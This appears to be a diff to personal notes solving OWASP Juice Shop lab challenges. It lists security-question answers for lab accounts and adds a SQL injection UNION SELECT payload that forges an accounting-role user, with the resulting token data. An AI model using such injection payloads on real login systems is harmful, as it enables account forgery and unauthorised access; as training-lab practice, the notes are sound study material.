@@ -159,3 +159,27 @@ security answer = Silence of the Lambs
 ********************************************
 morty@juice-sh.op
 Security answer = Snowball => 5N0wb41L
+
+********************************************
+acc0unt4nt@juice-sh.op
+SQL ınjection is = ' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '2020-08-16 14:14:41.644 +00:00' as 'createdAt', '2020-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--
+
+"data": {
+    "id": 15,
+    "username": "",
+    "email": "acc0unt4nt@juice-sh.op",
+    "password": "12345",
+    "role": "accounting",
+    "deluxeToken": "123",
+    "lastLoginIp": "1.2.3.4",
+    "profileImage": "/assets/public/images/uploads/default.svg",
+    "totpSecret": "",
+    "isActive": true,
+    "createdAt": "2020-08-16 14:14:41.644 +00:00",
+    "updatedAt": "2020-08-16 14:33:41.930 +00:00",
+    "deletedAt": null
+  },
+  "iat": 1610024731,
+  "exp": 1610042731
+}
+
